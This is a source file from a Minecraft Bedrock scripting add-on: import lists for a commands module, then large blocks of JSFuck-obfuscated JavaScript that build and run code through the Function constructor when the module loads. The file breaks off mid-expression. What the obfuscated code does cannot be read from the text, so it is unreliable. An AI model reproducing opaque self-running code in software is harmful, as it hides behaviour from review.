import { Block, BlockInventoryComponent, BlockPermutation, ChatSendBeforeEvent, Container, Dimension, DimensionTypes, EntityInventoryComponent, ItemStack, Player, system, world, Entity, EquipmentSlot, Vector, ContainerSlot, EntityEquippableComponent, BlockType, BlockTypes, ItemTypes, ItemType, ItemLockMode, CompoundBlockVolume, BlockVolumeIntersection, BlockVolume, BlockVolumeBase, GameMode, MolangVariableMap, EffectType } from "@minecraft/server";
import { targetSelectorB, targetSelectorAllListB, targetSelectorAllListC, targetSelectorAllListE, targetSelector, getTopSolidBlock, arrayModifier, arrayToElementList, getAIIDClasses, getArrayElementProperty, debugAction, generateAIID, targetSelectorAllListD, toBase, fromBaseToBase, interactable_block, interactable_blockb, combineObjects, customFormUIElement, getCUIDClasses, strToCustomFormUIElement, generateCUID, fixedPositionNumberObject, format_version, getUICustomForm, generateTUID, JSONParse, JSONStringify, roundPlaceNumberObject, worldPlayers, timeZones, getParametersFromString, arrayModifierOld, customModulo, escapeRegExp, extractJSONStrings, getParametersFromExtractedJSON, jsonFromString, JSONParseOld, JSONStringifyOld, arrayify, objectify, stringify, mainEval, debugActionb, indirectMainEval, gedp, gidp, gwdp, mainRun, sedp, sidp, swdp, fillBlocks, fillBlocksB, asend, bsend, csend, shootEntity, shootEntityB, shootProjectile, shootProjectileB, splitTextByMaxProperyLength, catchtry, cerror, cinfo, clog, cwarn, mainmetaimport, srun, gt, fillBlocksC, fillBlocksD, fillBlocksCG, fillBlocksH, fillBlocksHW, fillBlocksHB, fillBlocksHH, fillBlocksHO, fillBlocksHP, scanForContainerBlocks, clearAllContainerBlocks, fillBlocksHC, fillBlocksHS, fillBlocksHHS, fillBlocksHT, fillBlocksHSG, fillBlocksHHSG, fillBlocksHDG, fillBlocksHSSG, fillBlocksHOG, fillBlocksHHOG, fillBlocksHSGG, fillBlocksHISGG } from "../Main";
import { LocalTeleportFunctions, coordinates, coordinatesB, evaluateCoordinates, anglesToDirectionVector, anglesToDirectionVectorDeg, caretNotationB, caretNotation, caretNotationC, caretNotationD, coordinatesC, coordinatesD, coordinatesE, coordinates_format_version, evaluateCoordinatesB, movePointInDirection, facingPoint, WorldPosition, rotate, rotate3d, roundVector3ToMiddleOfBlock, generateTickingAreaFillCoordinatesC, } from "./coordinates";
import { ban, ban_format_version } from "./ban";
import { player_save_format_version, savedPlayer } from "./player_save.js";
import { editAreas, noPistonExtensionAreas, noBlockBreakAreas, noBlockInteractAreas, noBlockPlaceAreas, noExplosionAreas, noInteractAreas, protectedAreas, testIsWithinRanges, getAreas, spawnProtectionTypeList, spawn_protection_format_version, convertToCompoundBlockVolume, getType, editAreasMainMenu } from "./spawn_protection.js";
import { customElementTypeIds, customFormListSelectionMenu, editCustomFormUI, forceShow, showCustomFormUI, addNewCustomFormUI, customElementTypes, customFormDataTypeIds, customFormDataTypes, customFormUIEditor, customFormUIEditorCode, ui_format_version, settings, personalSettings, editorStickB, editorStickMenuB, mainMenu, globalSettings, evalAutoScriptSettings, editorStickMenuC, inventoryController, editorStickC, playerController, entityController, scriptEvalRunWindow, editorStick, managePlayers, terminal, manageCommands } from "./ui.js";
import * as GameTest from "@minecraft/server-gametest";
import * as mcServer from "@minecraft/server";
import * as mcServerUi from "@minecraft/server-ui"; /*
import * as mcServerAdmin from "@minecraft/server-admin";*/ /*
import * as mcDebugUtilities from "@minecraft/debug-utilities";*/ /*
import * as mcCommon from "@minecraft/common";*/ /*
import * as mcVanillaData from "@minecraft/vanilla-data";*/
import * as main from "../Main";
import * as coords from "./coordinates";
import * as cmds from "./commands";
import * as bans from "./ban";
import * as uis from "./ui";
import * as playersave from "./player_save";
import * as spawnprot from "./spawn_protection";
export const cmdsmetaimport = import.meta;
mcServer;
mcServerUi; /*
mcServerAdmin*/ /*
mcDebugUtilities*/ /*
mcCommon*/
GameTest; /*
mcVanillaData*/
main;
coords;
cmds;
bans;
uis;
playersave;
spawnprot;
export const commands_format_version = "8.1.0-rc.99";
// @ts-expect-error
[][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (![] + [+[]] + ([] + [])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]])[!+[] + !+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][(!![] + [])[!+[] + !+[] + !+[]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]() + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[+!+[]] + (+(!+[] + !+[] + [+!+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [+!+[]])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]])()([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[(![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[!+[] + !+[] + !+[]]]((+((+(+!+[] + [+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + [+[] + [+[]] + [+[]] + [+[]] + [+[]] + [+[]] + [+!+[]]]) + [])[!+[] + !+[]] + [+!+[]]) + (![] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[!+[] + !+[] + !+[]])()())[!+[] + !+[] + !+[] + [+[]]] + (+(+!+[] + [+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + [+!+[]])[+!+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[] + !+[]])()[(!![] + [])[+[]] + (![] + [])[+[]] + (![] + [])[!+[] + !+[] + !+[]] + (![] + [])[+!+[]]] = [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((![] + [])[+[]], (!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+[]],(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+([]+{})[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+(![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+","+"\\""+(+[![]]+[][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]())[+!+[]+[+!+[]]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+"\\""+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+[]],(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(![]+[])[+[]])(f))');
// @ts-expect-error
let tfsb = ((b) => (([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!
// @ts-expect-error
![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][
// @ts-expect-error
(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]
// @ts-expect-error
])[+!+[] + [+[]]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]
// @ts-expect-error
]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] +
    // @ts-expect-error
    ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] +
    // @ts-expect-error
    (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] +
        // @ts-expect-error
        (!![] + [])[+[]]])[+!+[] + [+!+[]]] +
    // @ts-expect-error
    (!![] + [])[+[]] + (![] + [])[+[]] + (![] + [])[!+[] + !+[] + !
// @ts-expect-error
+[]] + (![] + [])[+!+[]])()(b) && ![][(![] + [])[+[]] + (![] +
    // @ts-expect-error
    [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]
// @ts-expect-error
